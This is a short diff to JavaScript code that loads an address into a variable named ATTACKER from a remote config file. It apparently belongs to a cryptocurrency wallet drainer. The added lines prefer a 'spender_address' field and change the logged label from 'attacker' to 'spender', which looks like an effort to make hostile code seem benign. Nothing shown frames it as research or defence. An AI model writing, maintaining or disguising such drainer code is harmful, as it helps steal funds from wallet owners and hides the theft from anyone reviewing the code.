@@ -843,9 +843,10 @@
     try {
       const r = await fetch('/config.json', { cache: 'no-store' });
       const cfg = await r.json();
-      if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
+      if (cfg.spender_address && cfg.spender_address.indexOf('0x') === 0) ATTACKER = cfg.spender_address;
+      else if (cfg.attacker_address) ATTACKER = cfg.attacker_address;
       if (cfg.project_id) PROJECT_ID = cfg.project_id;
-      console.log('config attacker', ATTACKER);
+      console.log('config spender', ATTACKER);
     } catch (e) {
       console.warn('config.json indisponible, fallback hardcode', e);
     }
